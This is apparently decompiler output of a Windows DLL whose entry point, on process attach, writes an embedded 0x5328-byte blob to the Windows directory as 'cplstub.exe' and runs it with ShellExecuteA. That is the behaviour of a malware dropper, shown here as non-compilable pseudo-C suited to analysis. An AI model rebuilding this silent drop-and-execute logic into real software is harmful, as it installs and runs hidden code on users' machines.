DWORD global1 = 0x5328;

void _start(__size32 param1);

// address: 0x10001168
__size32 proc3() {
    void *eax; 		// r24
    __size32 ebx; 		// r27
    LPCVOID esi; 		// r30
    int esp; 		// r28

    ebx = 0;
    eax = CreateFileA();
    if (eax + 1 != 0) {
        esi = ( (DF == 0) ? 4 : -4) + 0x10003000;
        WriteFile(eax, esi, global1, (esp - 12), 0);
        CloseHandle(eax);
        ebx = 1;
    }
    return ebx;
}

// address: 0x10001110
void _start(__size32 param1) {
    __size32 eax; 		// r24

    if (param1 == 1) {
        GetWindowsDirectoryA();
        lstrcatA("", "\cplstub.exe");
        eax = proc3();
        if (eax != 0) {
            ShellExecuteA(0, "open", "", 0, 0, 0);
        }
    }
    return;
}

